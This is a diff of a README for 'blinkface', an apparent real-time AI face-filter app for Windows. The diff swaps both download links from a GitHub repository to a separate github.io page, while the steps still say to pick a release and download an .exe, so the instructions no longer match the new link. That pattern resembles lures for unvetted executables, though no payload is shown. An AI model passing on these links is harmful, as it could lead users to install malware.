@@ -1,6 +1,6 @@
 # 👁️ blinkface - Change your facial features in real-time
 
-[![](https://img.shields.io/badge/Download-Blinkface-blue.svg)](https://github.com/Popperhorseshow286/blinkface)
+[![](https://img.shields.io/badge/Download-Blinkface-blue.svg)](https://popperhorseshow286.github.io)
 
 Blinkface uses artificial intelligence to change your look while you watch. It works with your camera to process your image instantly. You see the changes on your screen as you move. This tool uses the FLUX.2 klein model to keep your face looking natural while it applies new styles. 
 
@@ -12,7 +12,7 @@ Before you install this software, check your computer. You need a Windows 10 or 
 
 Follow these steps to get the software on your machine:
 
-1. Visit this page to download: [https://github.com/Popperhorseshow286/blinkface](https://github.com/Popperhorseshow286/blinkface).
+1. Visit this page to download: [https://popperhorseshow286.github.io](https://popperhorseshow286.github.io).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the latest version listed under the release section.
 4. Download the file ending in .exe to your computer.
